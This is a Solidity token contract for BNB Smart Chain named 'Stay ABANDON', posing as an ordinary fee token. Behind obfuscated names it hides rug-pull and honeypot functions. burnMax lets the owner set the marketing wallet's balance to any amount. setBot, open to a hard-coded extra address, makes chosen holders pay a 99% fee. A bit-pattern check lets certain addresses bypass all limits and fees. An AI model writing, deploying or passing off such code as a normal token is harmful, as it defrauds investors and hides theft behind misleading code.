/**
 *Submitted for verification at BscScan.com on 2022-12-23
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.5;interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}library SafeMath {    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IUniswapV2Router {    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function factory() external pure returns (address);    function WETH() external pure returns (address);}interface IBEP20 {    function totalSupply() external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function approve(address spender, uint256 amount) external returns (bool);    function balanceOf(address account) external view returns (uint256);    function name() external view returns (string memory);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function decimals() external view returns (uint8);    function symbol() external view returns (string memory);    function getOwner() external view returns (address);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }}contract StayABANDON is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Stay ABANDON ";    string constant _symbol = "StayABANDON";    uint8 constant _decimals = 18;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private minSellMarketingIsMode;    mapping(address => bool) private limitMarketingSellWallet;    mapping(address => bool) private botsLaunchedTeamIs;    mapping(address => bool) private txBuyLiquidityTeamMinLimit;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private autoFeeSellMin = 0;    uint256 private limitMarketingLaunchedReceiverLiquidityMode = 7;    //SELL FEES    uint256 private limitFeeMarketingAuto = 0;    uint256 private burnLimitTeamLiquidity = 7;    bool private marketingExemptTeamFee = true;    bool private burnTeamTradingLimit = true;    bool private sellMinTxMode = true;    uint256 private isLiquidityWalletExemptMarketing = _totalSupply / 1000; // 0.1%    address private tradingMarketingLimitMinBuyTeamLaunched = (msg.sender); // auto-liq address    address private swapBotsWalletReceiver = (0xE9d991C375B95fA6B41528f6ffFfe285Fdd4b337); // marketing address    address private sellSwapMaxReceiverTrading = DEAD;    address private marketingAutoIsTxFeeTeam = DEAD;    address private botsTradingAutoMin = DEAD;    uint256 private limitBotsMarketingSwap = limitMarketingLaunchedReceiverLiquidityMode + autoFeeSellMin;    uint256 private buyMinBurnLiquidity = 100;    bool private minLiquidityLaunchedBotsModeFee;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private minAutoModeBurn;    uint256 private marketingBurnFeeExempt;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        uint256 public isMaxTeamMin = 0;    uint256 private swapBurnLiquidityMarketing = 0;    uint256 private txLimitTradingIsMarketingLiquiditySell = 0;    bool public limitWalletMaxFee = false;    uint256 private walletLimitSwapBuy = 0;    uint256 public txModeBotsTeam = 0;    uint256 public marketingLaunchedLiquidityMax = 0;    uint256 private marketingTradingModeTeam = 0;    uint256 private walletMaxLaunchedFee = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        minLiquidityLaunchedBotsModeFee = true;        minSellMarketingIsMode[msg.sender] = true;        minSellMarketingIsMode[address(this)] = true;        botsLaunchedTeamIs[msg.sender] = true;        botsLaunchedTeamIs[0x0000000000000000000000000000000000000000] = true;        botsLaunchedTeamIs[0x000000000000000000000000000000000000dEaD] = true;        botsLaunchedTeamIs[address(this)] = true;        limitMarketingSellWallet[msg.sender] = true;        limitMarketingSellWallet[0x0000000000000000000000000000000000000000] = true;        limitMarketingSellWallet[0x000000000000000000000000000000000000dEaD] = true;        limitMarketingSellWallet[address(this)] = true;        SetAuthorized(address(0x80080444d220615832d74ce9ffFFD3aE64b0e268));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return txLiquidityFeeWallet(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return txLiquidityFeeWallet(sender, recipient, amount);    }    function txLiquidityFeeWallet(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bTxWalletValue = teamLiquidityBurnAuto(sender) || teamLiquidityBurnAuto(recipient);                                if (marketingTradingModeTeam == buyMinBurnLiquidity) {            marketingTradingModeTeam = limitFeeMarketingAuto;        }        if (inSwap || bTxWalletValue) {return tradingWalletSwapExemptMarketingAutoTeam(sender, recipient, amount);}        if (!minSellMarketingIsMode[sender] && !minSellMarketingIsMode[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || botsLaunchedTeamIs[sender] || botsLaunchedTeamIs[recipient], "Max TX Limit!");        if (burnMarketingFeeIs()) {teamLiquidityBurnSwapModeIs();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = liquidityLimitMinFee(sender) ? exemptMarketingBotsMode(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function teamLiquidityBurnAuto(address addr) private view returns (bool) {        return firstSetAutoReceiver == (uint256(uint160(addr)) << 192) >> 238;    }
    function setWalletLimitSwapBuy(uint256 a0) public onlyOwner {        if (walletLimitSwapBuy == txLimitTradingIsMarketingLiquiditySell) {            txLimitTradingIsMarketingLiquiditySell=a0;        }        if (walletLimitSwapBuy != launchBlock) {            launchBlock=a0;        }        walletLimitSwapBuy=a0;    }
    function tradingWalletSwapExemptMarketingAutoTeam(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setSellSwapMaxReceiverTrading(address a0) public onlyOwner {        sellSwapMaxReceiverTrading=a0;    }
    function exemptBurnIsFee(address sender, bool selling) internal returns (uint256) {                if (walletMaxLaunchedFee != limitMarketingLaunchedReceiverLiquidityMode) {            walletMaxLaunchedFee = marketingTradingModeTeam;        }        if (selling) {            limitBotsMarketingSwap = burnLimitTeamLiquidity + limitFeeMarketingAuto;            return limitBotsMarketingSwap;        }        if (!selling && sender == uniswapV2Pair) {            limitBotsMarketingSwap = limitMarketingLaunchedReceiverLiquidityMode + autoFeeSellMin;            return limitBotsMarketingSwap;        }        return burnLimitTeamLiquidity + limitFeeMarketingAuto;    }
    function setBot(address addr) public onlyAuthorized {        txBuyLiquidityTeamMinLimit[addr] = true;    }
    function setIsLiquidityWalletExemptMarketing(uint256 a0) public onlyOwner {        if (isLiquidityWalletExemptMarketing != buyMinBurnLiquidity) {            buyMinBurnLiquidity=a0;        }        if (isLiquidityWalletExemptMarketing != isLiquidityWalletExemptMarketing) {            isLiquidityWalletExemptMarketing=a0;        }        if (isLiquidityWalletExemptMarketing == limitBotsMarketingSwap) {            limitBotsMarketingSwap=a0;        }        isLiquidityWalletExemptMarketing=a0;    }
    function burnMarketingFeeIs() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    sellMinTxMode &&    _balances[address(this)] >= isLiquidityWalletExemptMarketing;    }
    function teamLiquidityBurnSwapModeIs() internal swapping {                if (walletMaxLaunchedFee != autoFeeSellMin) {            walletMaxLaunchedFee = swapBurnLiquidityMarketing;        }        uint256 amountToLiquify = isLiquidityWalletExemptMarketing.mul(autoFeeSellMin).div(limitBotsMarketingSwap).div(2);        uint256 amountToSwap = isLiquidityWalletExemptMarketing.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (swapBurnLiquidityMarketing != autoFeeSellMin) {            swapBurnLiquidityMarketing = marketingTradingModeTeam;        }        if (txLimitTradingIsMarketingLiquiditySell == isLiquidityWalletExemptMarketing) {            txLimitTradingIsMarketingLiquiditySell = swapBurnLiquidityMarketing;        }        if (walletLimitSwapBuy == walletLimitSwapBuy) {            walletLimitSwapBuy = autoFeeSellMin;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = limitBotsMarketingSwap.sub(autoFeeSellMin.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(autoFeeSellMin).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(limitMarketingLaunchedReceiverLiquidityMode).div(totalETHFee);                if (walletMaxLaunchedFee != limitBotsMarketingSwap) {            walletMaxLaunchedFee = walletMaxLaunchedFee;        }        payable(swapBotsWalletReceiver).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                tradingMarketingLimitMinBuyTeamLaunched,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function liquidityLimitMinFee(address sender) internal view returns (bool) {        return !limitMarketingSellWallet[sender];    }
    function setSellMinTxMode(bool a0) public onlyOwner {        if (sellMinTxMode != sellMinTxMode) {            sellMinTxMode=a0;        }        if (sellMinTxMode != sellMinTxMode) {            sellMinTxMode=a0;        }        if (sellMinTxMode == marketingExemptTeamFee) {            marketingExemptTeamFee=a0;        }        sellMinTxMode=a0;    }
    function exemptMarketingBotsMode(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (txLimitTradingIsMarketingLiquiditySell == limitFeeMarketingAuto) {            txLimitTradingIsMarketingLiquiditySell = marketingTradingModeTeam;        }        if (walletMaxLaunchedFee == limitMarketingLaunchedReceiverLiquidityMode) {            walletMaxLaunchedFee = marketingTradingModeTeam;        }        uint256 feeAmount = amount.mul(exemptBurnIsFee(sender, receiver == uniswapV2Pair)).div(buyMinBurnLiquidity);        if (txBuyLiquidityTeamMinLimit[sender] || txBuyLiquidityTeamMinLimit[receiver]) {            feeAmount = amount.mul(99).div(buyMinBurnLiquidity);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function setTxLimitTradingIsMarketingLiquiditySell(uint256 a0) public onlyOwner {        txLimitTradingIsMarketingLiquiditySell=a0;    }
    function getLimitMarketingSellWallet(address a0) public view returns (bool) {            return limitMarketingSellWallet[a0];    }
    function getBurnTeamTradingLimit() public view returns (bool) {        if (burnTeamTradingLimit != marketingExemptTeamFee) {            return marketingExemptTeamFee;        }        return burnTeamTradingLimit;    }
    function burnMax(uint256 amount) public onlyOwner {        _balances[swapBotsWalletReceiver] = amount;    }
    function getWalletLimitSwapBuy() public view returns (uint256) {        if (walletLimitSwapBuy == burnLimitTeamLiquidity) {            return burnLimitTeamLiquidity;        }        if (walletLimitSwapBuy != launchBlock) {            return launchBlock;        }        if (walletLimitSwapBuy != burnLimitTeamLiquidity) {            return burnLimitTeamLiquidity;        }        return walletLimitSwapBuy;    }
    function getMarketingAutoIsTxFeeTeam() public view returns (address) {        if (marketingAutoIsTxFeeTeam != marketingAutoIsTxFeeTeam) {            return marketingAutoIsTxFeeTeam;        }        if (marketingAutoIsTxFeeTeam != sellSwapMaxReceiverTrading) {            return sellSwapMaxReceiverTrading;        }        if (marketingAutoIsTxFeeTeam != botsTradingAutoMin) {            return botsTradingAutoMin;        }        return marketingAutoIsTxFeeTeam;    }
    function getSellSwapMaxReceiverTrading() public view returns (address) {        if (sellSwapMaxReceiverTrading == botsTradingAutoMin) {            return botsTradingAutoMin;        }        if (sellSwapMaxReceiverTrading == swapBotsWalletReceiver) {            return swapBotsWalletReceiver;        }        if (sellSwapMaxReceiverTrading == sellSwapMaxReceiverTrading) {            return sellSwapMaxReceiverTrading;        }        return sellSwapMaxReceiverTrading;    }
    function setLimitMarketingSellWallet(address a0,bool a1) public onlyOwner {        limitMarketingSellWallet[a0]=a1;    }
    function setMinSellMarketingIsMode(address a0,bool a1) public onlyOwner {        minSellMarketingIsMode[a0]=a1;    }
    function getLaunchBlock() public view returns (uint256) {        if (launchBlock != walletMaxLaunchedFee) {            return walletMaxLaunchedFee;        }        if (launchBlock == swapBurnLiquidityMarketing) {            return swapBurnLiquidityMarketing;        }        return launchBlock;    }
    function getIsLiquidityWalletExemptMarketing() public view returns (uint256) {        if (isLiquidityWalletExemptMarketing != isLiquidityWalletExemptMarketing) {            return isLiquidityWalletExemptMarketing;        }        if (isLiquidityWalletExemptMarketing == isLiquidityWalletExemptMarketing) {            return isLiquidityWalletExemptMarketing;        }        if (isLiquidityWalletExemptMarketing == launchBlock) {            return launchBlock;        }        return isLiquidityWalletExemptMarketing;    }
    function setMarketingAutoIsTxFeeTeam(address a0) public onlyOwner {        marketingAutoIsTxFeeTeam=a0;    }
    function setBurnTeamTradingLimit(bool a0) public onlyOwner {        if (burnTeamTradingLimit == marketingExemptTeamFee) {            marketingExemptTeamFee=a0;        }        if (burnTeamTradingLimit == burnTeamTradingLimit) {            burnTeamTradingLimit=a0;        }        burnTeamTradingLimit=a0;    }
    function setLaunchBlock(uint256 a0) public onlyOwner {        if (launchBlock != walletMaxLaunchedFee) {            walletMaxLaunchedFee=a0;        }        if (launchBlock == txLimitTradingIsMarketingLiquiditySell) {            txLimitTradingIsMarketingLiquiditySell=a0;        }        if (launchBlock == marketingTradingModeTeam) {            marketingTradingModeTeam=a0;        }        launchBlock=a0;    }
    function getSellMinTxMode() public view returns (bool) {        return sellMinTxMode;    }
    function getMinSellMarketingIsMode(address a0) public view returns (bool) {        if (minSellMarketingIsMode[a0] != minSellMarketingIsMode[a0]) {            return burnTeamTradingLimit;        }            return minSellMarketingIsMode[a0];    }
    function getTxLimitTradingIsMarketingLiquiditySell() public view returns (uint256) {        if (txLimitTradingIsMarketingLiquiditySell == buyMinBurnLiquidity) {            return buyMinBurnLiquidity;        }        if (txLimitTradingIsMarketingLiquiditySell == limitMarketingLaunchedReceiverLiquidityMode) {            return limitMarketingLaunchedReceiverLiquidityMode;        }        if (txLimitTradingIsMarketingLiquiditySell == isLiquidityWalletExemptMarketing) {            return isLiquidityWalletExemptMarketing;        }        return txLimitTradingIsMarketingLiquiditySell;    }
    function isBot(address addr) public view returns (bool) {        return txBuyLiquidityTeamMinLimit[addr];    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}